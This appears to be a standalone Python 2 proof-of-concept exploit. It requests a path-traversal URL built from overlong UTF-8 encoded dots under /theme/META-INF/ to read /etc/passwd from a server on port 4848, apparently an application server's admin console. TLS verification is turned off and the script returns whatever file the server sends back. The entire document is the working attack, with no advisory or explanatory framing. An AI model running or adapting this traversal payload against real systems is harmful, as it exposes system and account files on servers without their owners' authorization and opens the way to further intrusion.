import requests

def run(url, timeout=5):
	try:
		path = r'/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
		r = requests.get(url + path, timeout=timeout, verify=False)
		return r.content
	except Exception as e:
		print e
		pass


if __name__ == '__main__':
    print run('https://127.0.0.1:4848')
